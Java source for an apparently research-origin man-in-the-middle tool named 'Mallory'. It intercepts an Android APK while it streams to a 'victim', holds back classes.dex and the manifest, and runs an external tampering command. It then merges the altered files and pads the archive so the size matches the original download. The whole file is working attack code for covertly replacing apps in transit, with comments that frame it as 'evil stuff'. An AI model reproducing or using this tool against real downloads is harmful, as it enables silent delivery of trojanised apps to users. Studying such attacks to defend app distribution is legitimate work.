/*
 * Copyright (C) 2014 ph4r05
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package cz.muni.fi.xklinec.zipstream;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.Deflater;
import org.apache.commons.compress.archivers.zip.UnparseableExtraFieldData;
import org.apache.commons.compress.archivers.zip.UnrecognizedExtraField;
import org.apache.commons.compress.archivers.zip.ZipArchiveEntry;
import org.apache.commons.compress.archivers.zip.ZipArchiveInputStream;
import org.apache.commons.compress.archivers.zip.ZipArchiveOutputStream;
import org.apache.commons.compress.archivers.zip.ZipExtraField;
import org.apache.commons.compress.archivers.zip.ZipShort;
import org.apache.commons.io.FileUtils;
import org.bouncycastle.util.io.TeeInputStream;
import org.kohsuke.args4j.Argument;
import org.kohsuke.args4j.CmdLineException;
import org.kohsuke.args4j.CmdLineParser;
import org.kohsuke.args4j.ExampleMode;
import org.kohsuke.args4j.Option;

/**
 *
 * @author ph4r05
 */
public class Mallory {
    public static final String TEMP_DIR = "/tmp/";
    public static final String INPUT_APK_PLACEHOLDER = "<<INPUTAPK>>";
    public static final String OUTPUT_APK_PLACEHOLDER = "<<OUTPUTAPK>>";
    
    public static final int END_OF_CENTRAL_DIR_SIZE = 22;
    public static final int EXTRA_FIELD_SIZE = 8;
    public static final int MAX_EXTRA_SIZE = 65535;
    
    public static final int DEFAULT_PADDING_EXTRA = 4096;
    
    public static final String ANDROID_MANIFEST = "AndroidManifest.xml";
    public static final String CLASSES = "classes.dex";
    public static final String META_INF = "META-INF";
    
    // receives other command line parameters than options
    @Argument
    private final List<String> arguments = new ArrayList<String>(8);
    
    @Option(name = "--cmd", aliases = {"-c"}, usage = "Command for APK modification. APK to modify will be passed as the first argument. "
            + "After command is finished, inputfile_mod.apk is axpected in the same folder as a result of modification. If not provided, "
            + "modification will be simulated. ")
    private String cmd=null;
    
    @Option(name = "--format", aliases = {"-f"}, usage = "Format of the cmd call. \n0=input APK file name is appended to the cmd"
            + "\n1=input apk is substituted for placeholder " + INPUT_APK_PLACEHOLDER
            + "\n2=as 1 + output apk is substituted for placeholder " + OUTPUT_APK_PLACEHOLDER)
    private int cmdFormat=0;
    
    @Option(name = "--out", aliases = {"-o"}, usage = "Tampered APK filename (after tampering is finished, this is read for diff.).")
    private String outFile;
    
    @Option(name = "--quiet", aliases = {"-q"}, usage = "No output on stderr.")
    private boolean quiet = false;
    
    @Option(name = "--zip-align", aliases = {"-z"}, usage = "Apply ZIP align on resulting APK (stream output).")
    private boolean zipAlign = false;
    
    @Option(name = "--output-size", aliases = {"-s"}, usage = "Desired size of the resulting APK in bytes. By default size(original_APK)+"+DEFAULT_PADDING_EXTRA+".")
    private long outBytes = 0;
    
    @Option(name = "--padd-extra", aliases = {"-p"}, usage = "Desired padding of the resulting APK in bytes. Is used only if output-size is zero.\nsize(out_APK) = size(original_APK) + padd_extra.")
    private long paddExtra = DEFAULT_PADDING_EXTRA;
    
    private static Mallory runningInstance;
    public static void main(String[] args) {
        try {
            // do main on instance
            runningInstance = new Mallory();

            // do the main
            runningInstance.doMain(args);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    private OutputStream fos = null;
    private InputStream  fis = null;
    private Deflater def;
    private ZipArchiveInputStream zip;
    private ZipArchiveOutputStream zop;
    private File newApk;
    private File tempApk;
    
    private Map<String, PostponedEntry> alMap;
    private List<PostponedEntry> peList;
    private List<PostponedEntry> prList;
    
    /**
     * Entry point. 
     * 
     * @param args
     * @throws FileNotFoundException
     * @throws IOException
     * @throws NoSuchFieldException
     * @throws ClassNotFoundException
     * @throws NoSuchMethodException 
     */
    public void doMain( String[] args ) throws FileNotFoundException, IOException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, InterruptedException, CloneNotSupportedException
    {   
        // command line argument parser
        CmdLineParser parser = new CmdLineParser(this);

        // if you have a wider console, you could increase the value;
        // here 80 is also the default
        parser.setUsageWidth(80);
        try {
            // parse the arguments.
            parser.parseArgument(args);
        } catch (CmdLineException e) {
            // if there's a problem in the command line,
            // you'll get this exception. this will report
            // an error message.
            System.err.println(e.getMessage());
            System.err.println("java Mallory [options...] arguments...");
            // print the list of available options
            parser.printUsage(System.err);
            System.err.println();

            // print option sample. This is useful some time
            System.err.println(" Example: java Mallory " + parser.printExample(ExampleMode.ALL));
            return;
        }
             
        if (arguments.size()==2){
            final String a0 = arguments.get(0);
            final String a1 = arguments.get(1);
            
            if (!quiet) System.err.println(String.format("Will use file [%s] as input file and [%s] as output file", a0, a1));
            fis = new FileInputStream(a0);
            fos = new FileOutputStream(a1);
        } else if (arguments.isEmpty()){
            if (!quiet) System.err.println(String.format("Will use file [STDIN] as input file and [STDOUT] as output file"));
            fis = System.in;
            fos = System.out;
        } else {
            if (!quiet) System.err.println("I do not understand the usage.");
            return;
        }
        
        if (zipAlign){
            System.err.println("WARNING: ZIP Align feature not implemented yet...");
            return;
        }
        
        // Deflater to re-compress uncompressed data read from ZIP stream.
        def = new Deflater(9, true);
        
        // Generate temporary APK filename
        tempApk = File.createTempFile(TEMP_DIR + "_temp_apk", ".apk");
        FileOutputStream tos = new FileOutputStream(tempApk);
        
        // What we want here is to read input stream from the socket/pipe 
        // whatever, process it in ZIP logic and simultaneously to copy 
        // all read data to the temporary file - this reminds tee command
        // logic. This functionality can be found in TeeInputStream.
        TeeInputStream tis = new TeeInputStream(fis, tos);
        
        // Providing tis to ZipArchiveInputStream will copy all read data
        // to temporary tos file.
        zip = new ZipArchiveInputStream(tis);
        
        // List of all sent files, with data and hashes
        alMap = new HashMap<String, PostponedEntry>();
        // List of postponed entries for further "processing".
        peList = new ArrayList<PostponedEntry>(6);
        // Priority postponed entries - at the end of the archive.
        prList = new ArrayList<PostponedEntry>(6);
        
        // Output stream
        zop = new ZipArchiveOutputStream(fos);
        zop.setLevel(9);
        
        // Read the archive
        ZipArchiveEntry ze = zip.getNextZipEntry();
        while(ze!=null){
            
            ZipExtraField[] extra = ze.getExtraFields(true);
            byte[] lextra = ze.getLocalFileDataExtra();
            UnparseableExtraFieldData uextra = ze.getUnparseableExtraFieldData();
            byte[] uextrab = uextra != null ? uextra.getLocalFileDataData() : null;
            byte[] ex = ze.getExtra();
            // ZipArchiveOutputStream.DEFLATED
            // 
            
            // Data for entry
            byte[] byteData = Utils.readAll(zip);
            byte[] deflData = new byte[0];
            int infl = byteData.length;
            int defl = 0;
            
            // If method is deflated, get the raw data (compress again).
            // Since ZIPStream automatically decompresses deflated files in read().
            if (ze.getMethod() == ZipArchiveOutputStream.DEFLATED){
                def.reset();
                def.setInput(byteData);
                def.finish();
                
                byte[] deflDataTmp = new byte[byteData.length*2];
                defl = def.deflate(deflDataTmp);
                
                deflData = new byte[defl];
                System.arraycopy(deflDataTmp, 0, deflData, 0, defl);
            }
            
            if (!quiet)
                System.err.println(String.format("ZipEntry: meth=%d "
                    + "size=%010d isDir=%5s "
                    + "compressed=%07d extra=%d lextra=%d uextra=%d ex=%d "
                    + "comment=[%s] "
                    + "dataDesc=%s "
                    + "UTF8=%s "
                    + "infl=%07d defl=%07d "
                    + "name [%s]", 
                    ze.getMethod(),
                    ze.getSize(), ze.isDirectory(),
                    ze.getCompressedSize(),
                    extra!=null  ?  extra.length : -1,
                    lextra!=null ? lextra.length : -1,
                    uextrab!=null ? uextrab.length : -1,
                    ex!=null ? ex.length : -1,
                    ze.getComment(),
                    ze.getGeneralPurposeBit().usesDataDescriptor(),
                    ze.getGeneralPurposeBit().usesUTF8ForNames(),
                    infl, defl,
                    ze.getName()));
            
            final String curName = ze.getName();
            
            // Store zip entry to the map for later check after the APK is recompiled.
            // Hashes will be compared with the modified APK files after the process.
            PostponedEntry al = new PostponedEntry(ze, byteData, deflData);
            alMap.put(curName, al);
            
            // META-INF files should be always on the end of the archive, 
            // thus add postponed files right before them
            if (curName.startsWith(META_INF)){
                // Add to priority postponed data (meta inf files @ the end of the file).
                PostponedEntry pr = new PostponedEntry(ze, byteData, deflData);
                prList.add(pr);
                
            } else if (CLASSES.equalsIgnoreCase(curName)
                 || ANDROID_MANIFEST.equalsIgnoreCase(curName)){
                
                // Capturing interesting files for us and store for later.
                // If the file is not interesting, send directly to the stream.
                
                 if (!quiet)
                    System.err.println("### Interesting file, postpone sending!!!");
                 
                 PostponedEntry pe = new PostponedEntry(ze, byteData, deflData);
                 peList.add(pe);
            } else {
                // Write ZIP entry to the archive
                zop.putArchiveEntry(ze);
                // Add file data to the stream
                zop.write(byteData, 0, infl);
                zop.closeArchiveEntry();
            }
            
            ze = zip.getNextZipEntry();
        }
 
        // Cleaning up stuff, all reading streams can be closed now.
        zip.close();
        fis.close();
        tis.close();
        tos.close();
        
        //
        // APK is finished here, all non-interesting files were sent to the 
        // zop strem (socket to the victim). Now APK transformation will
        // be performed, diff, sending rest of the files to zop.
        // 
        long flen = tempApk.length();
        if (outBytes<=0){
            outBytes = flen + paddExtra;
        }
        
        if (!quiet)
            System.err.println("APK reading finished, going to tamper downloaded "
                + " APK file ["+tempApk.toString()+"]; filezise=["+flen+"]");
        
        // New APK was generated, new filename = "tempApk_tampered"
        newApk = new File(outFile==null ? getFileName(tempApk.getAbsolutePath()) : outFile);
        
        if (cmd==null){
            // Simulation of doing some evil stuff on the temporary apk
            Thread.sleep(3000);
            
            if (!quiet)
                System.err.println("Tampered APK file: "
                + " ["+newApk.toString()+"]; filezise=["+newApk.length()+"]");
        
            //
            // Since no tampering was performed right now we will simulate it by just simple
            // copying the APK file 
            //
            FileUtils.copyFile(tempApk, newApk);
        } else {
            try {
                // Execute command
                String cmd2exec;
                switch(cmdFormat){
                    case 0: 
                        cmd2exec = cmd + " " + tempApk.getAbsolutePath(); 
                        break;
                    case 1: 
                        cmd2exec = cmd.replaceAll(INPUT_APK_PLACEHOLDER, tempApk.getAbsolutePath());
                        break;
                    case 2:
                        cmd2exec = cmd.replaceAll(INPUT_APK_PLACEHOLDER, tempApk.getAbsolutePath());
                        cmd2exec = cmd2exec.replaceAll(OUTPUT_APK_PLACEHOLDER, newApk.getAbsolutePath());
                        break;
                    default:
                        throw new IllegalArgumentException("Unknown command format number");
                }
                
                if (!quiet)
                    System.err.println("Command to be executed: " + cmd2exec);
                
                Process child = Runtime.getRuntime().exec(cmd2exec);
                child.waitFor();
            } catch (IOException e) {
            }
        }
        
        //
        // Now read new APK file with ZipInputStream and push new/modified files to the ZOP
        //
        fis = new FileInputStream(newApk);
        zip = new ZipArchiveInputStream(fis);
        
        // Merge tampered APK to the final, but in this first time
        // do it to the external buffer in order to get final apk size.
        // Copy state of the ZOP to the external variables. 
        zop.flush();
        
        long writtenBeforeDiff = zop.getWritten();
        OutputStream cout = zop.getOut();
        
        ZipArchiveOutputStream zop_back = zop;
        zop = zop.cloneThis();
        
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        zop.setOut(bos);
        
        mergeTamperedApk();
        zop.flush();
        
        // Now output stream almost contains APK file, central directory is not written yet.
        long writtenAfterDiff = zop.getWritten();
        
        if (!quiet)
            System.err.println(String.format("Tampered apk size yet; writtenBeforeDiff=%d writtenAfterDiff=%d", writtenBeforeDiff, writtenAfterDiff));
        
        // Write central directory header to temporary buffer to discover its size.
        zop.writeFinish();
        zop.flush();
        bos.flush();
        
        // Read new values
        long writtenAfterCentralDir = zop.getWritten();
        long centralDirLen = zop.getCdLength();
        byte[] buffAfterMerge =  bos.toByteArray(); 
        int endOfCentralDir = (int) (buffAfterMerge.length - (writtenAfterCentralDir-writtenBeforeDiff));
        
        // Determine number of bytes to add to APK.
        int padlen = (int) (outBytes - (writtenAfterCentralDir + endOfCentralDir) - EXTRA_FIELD_SIZE);
        if (!quiet)
            System.err.println(String.format("Remaining to pad=%d, writtenAfterCentralDir=%d "
                    + "centralDir=%d endOfCentralDir=%d centralDirOffset=%d "
                    + "buffSize=%d total=%d desired=%d ", 
                    padlen, writtenAfterCentralDir, 
                    centralDirLen, endOfCentralDir, 
                    zop.getCdOffset(), buffAfterMerge.length, 
                    writtenAfterCentralDir + endOfCentralDir, outBytes));
        
        // Max extra is 65535 bytes, assume we are right
        if (padlen > MAX_EXTRA_SIZE){
            throw new IllegalStateException("I assume pad length is less than max extra size");
        }
        
        if (padlen < 0){
            throw new IllegalStateException("Padlen cannot be negative, please increase padding size");
        }
        
        // Add padd size to file comment to central file directory, muhehe
        PostponedEntry mpe = this.alMap.get(ANDROID_MANIFEST);
        
        byte[] paddBuff = new byte[padlen];
        UnrecognizedExtraField zextra =  new UnrecognizedExtraField();
        zextra.setHeaderId(new ZipShort(0x123456));
        zextra.setLocalFileDataData(new byte[0]);
        zextra.setCentralDirectoryData(paddBuff);
        
        mpe.ze.addExtraField(zextra);
        
        //final String curComment = mpe.ze.getComment();
        //mpe.ze.setComment((curComment==null ? "" : curComment));// + (new String(new char[padlen]).replace('\0', ' ')));
        if (!quiet)
            System.err.println(String.format("Padding added to manifest comments [%s]", mpe.ze.getComment()));
        
        // Merge again, now with pre-defined pad comment size.
        fis = new FileInputStream(newApk);
        zip = new ZipArchiveInputStream(fis);
        // Revert changes - use clonned writer stream.
        zop = zop_back;
        
        long writtenBeforeDiff2 = zop.getWritten();
        
        // Merge tampered APK, now for real.
        mergeTamperedApk();
        zop.flush();
        
        long writtenAfterMerge2 = zop.getWritten();
        
        // Finish really        
        zop.finish();
        zop.flush();
        
        long writtenReally = zop.getWritten();
        long centralDirLen2 = zop.getCdLength();
        
        if (!quiet)
            System.err.println(String.format("Write stats; "
                    + "writtenBeforeDiff=%d writtenAfterDiff=%d "
                    + "writtenAfterCentralDir=%d centralDir=%d endOfCd=%d centralDirOffset=%d "
                    + "padlen=%d total=%d desired=%d", 
                    writtenBeforeDiff2, writtenAfterMerge2, 
                    writtenReally, centralDirLen2, endOfCentralDir, zop.getCdOffset(),
                    padlen, writtenReally + endOfCentralDir, outBytes));
        
        zop.close();
        fos.close();
        
        if (!quiet)
            System.err.println( "THE END!" );
    }
    
    /**
     * Reads tampered APK file (zip object is prepared for this file prior 
     * this function call).
     * 
     * If some file differs, newly created file is merged to the output zip stream.
     * 
     * @throws IOException 
     */
    public void mergeTamperedApk() throws IOException{
        // Read the tampered archive
        ZipArchiveEntry ze = zip.getNextZipEntry();
        while(ze!=null){
            
            // Data for entry
            byte[] byteData = Utils.readAll(zip);
            byte[] deflData = new byte[0];
            int infl = byteData.length;
            int defl = 0;
            
            // If method is deflated, get the raw data (compress again).
            if (ze.getMethod() == ZipArchiveOutputStream.DEFLATED){
                def.reset();
                def.setInput(byteData);
                def.finish();
                
                byte[] deflDataTmp = new byte[byteData.length*2];
                defl = def.deflate(deflDataTmp);
                
                deflData = new byte[defl];
                System.arraycopy(deflDataTmp, 0, deflData, 0, defl);
            }
            
            final String curName = ze.getName();
            PostponedEntry al = new PostponedEntry(ze, byteData, deflData);
            
            // Compare posponed entry with entry in previous
            if (alMap.containsKey(curName)==false){
                // This element is not in the archive at all! 
                // Add it to the zop
                if (!quiet)
                    System.err.println("Detected newly added file ["+curName+"] written prior dump: " + zop.getWritten());
                
                al.dump(zop);
            }
            
            // Check the entry against the old entry hash
            // All files are read linary from the new APK file
            // thus it will be put to the archive in the right order.
            PostponedEntry oldEntry = alMap.get(curName);
            if (oldEntry.hashByte.equals(al.hashByte)==false
                    || oldEntry.hashDefl.equals(al.hashDefl)==false){
                // Element was changed, add it to the zop 
                // 
                if (!quiet)
                    System.err.println("Detected modified file ["+curName+"] written prior dump: " + zop.getWritten());
                
                // If manifest is changed, add comments.
                if (ANDROID_MANIFEST.equalsIgnoreCase(curName)){
                    ZipExtraField[] extraFields = oldEntry.ze.getExtraFields(true);
                    al.ze.setExtraFields(extraFields);
                }
                
                al.dump(zop);
                
            } else if (curName.startsWith(META_INF)
                    || CLASSES.equalsIgnoreCase(curName)
                    || ANDROID_MANIFEST.equalsIgnoreCase(curName)){
                // File was not modified but is one of the postponed files, thus has to 
                // be flushed also.
                if (!quiet)
                    System.err.println("Postponed file not modified ["+curName+"] written prior dump: " + zop.getWritten());
                
                // If manifest is changed, add comments.
                if (ANDROID_MANIFEST.equalsIgnoreCase(curName)){
                    ZipExtraField[] extraFields = oldEntry.ze.getExtraFields(true);
                    al.ze.setExtraFields(extraFields);
                }
                
                al.dump(zop);
            }
            
            ze = zip.getNextZipEntry();
        }
    }
    
    /**
     * Returns filename for modified apk according to scheme below.
     * original_file.apk --> original_file_mod.apk
     * 
     * @param name
     * @return 
     */
    public String getFileName(String name){
        if (name.endsWith(".apk")==false){
            throw new IllegalArgumentException("Filename has to end on .apk");
        }
        
        name = name.replaceFirst("\\.apk$", "");
        name = name + "_mod.apk";
        
        return name;
    }
}
